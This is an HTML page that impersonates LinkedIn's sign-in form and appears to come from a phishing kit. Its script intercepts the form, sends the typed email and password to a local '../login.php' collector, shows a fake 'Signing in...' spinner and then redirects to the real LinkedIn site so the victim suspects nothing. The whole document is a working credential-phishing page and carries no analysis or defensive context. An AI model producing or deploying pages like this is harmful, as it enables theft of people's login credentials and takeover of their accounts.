<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>LinkedIn Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f3f2ef;display:flex;align-items:center;justify-content:center;min-height:100vh}.container{width:100%;max-width:400px;background:#fff;padding:24px;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.15),0 2px 3px rgba(0,0,0,.2)}.logo{color:#0a66c2;font-size:34px;font-weight:700;margin-bottom:8px}.title{font-size:32px;font-weight:400;color:rgba(0,0,0,.9);margin-bottom:8px}.subtitle{font-size:14px;color:rgba(0,0,0,.6);margin-bottom:24px}.input-field{width:100%;padding:12px;font-size:16px;border:1px solid rgba(0,0,0,.6);border-radius:4px;margin-bottom:16px}.input-field:focus{outline:none;border-color:#0a66c2;border-width:2px;padding:11px}.forgot{font-size:14px;font-weight:600;color:#0a66c2;margin-bottom:16px}.forgot a{color:#0a66c2;text-decoration:none}.login-btn{width:100%;padding:12px;font-size:16px;font-weight:600;color:#fff;background:#0a66c2;border:none;border-radius:24px;cursor:pointer}.login-btn:hover{background:#004182}.divider{display:flex;align-items:center;margin:24px 0;color:rgba(0,0,0,.6);font-size:14px}.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(0,0,0,.15)}.divider::before{margin-right:16px}.divider::after{margin-left:16px}.signup{text-align:center;font-size:16px}.signup a{color:#0a66c2;text-decoration:none;font-weight:600}.loading{display:none;text-align:center;padding:20px}.spinner{border:3px solid #f3f3f3;border-top:3px solid #0a66c2;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
</head><body><div class="container"><div class="logo">Linked<span style="background:#0a66c2;color:#fff;padding:0 3px;border-radius:2px">in</span></div><h1 class="title">Sign in</h1><p class="subtitle">Stay updated on your professional world</p><form id="loginForm" method="POST" action="../login.php"><input type="email" name="email" class="input-field" placeholder="Email or phone" required><input type="password" name="password" class="input-field" placeholder="Password" required><div class="forgot"><a href="#">Forgot password?</a></div><button type="submit" class="login-btn">Sign in</button></form><div class="divider">or</div><div class="signup">New to LinkedIn? <a href="#">Join now</a></div><div class="loading" id="loading"><div class="spinner"></div><p>Signing in...</p></div></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();document.querySelector('form').style.display='none';document.querySelector('.forgot').style.display='none';document.querySelector('.divider').style.display='none';document.querySelector('.signup').style.display='none';document.getElementById('loading').style.display='block';fetch('../login.php',{method:'POST',body:new FormData(this)}).then(()=>setTimeout(()=>window.location.href='https://www.linkedin.com/',2000));});</script></body></html>
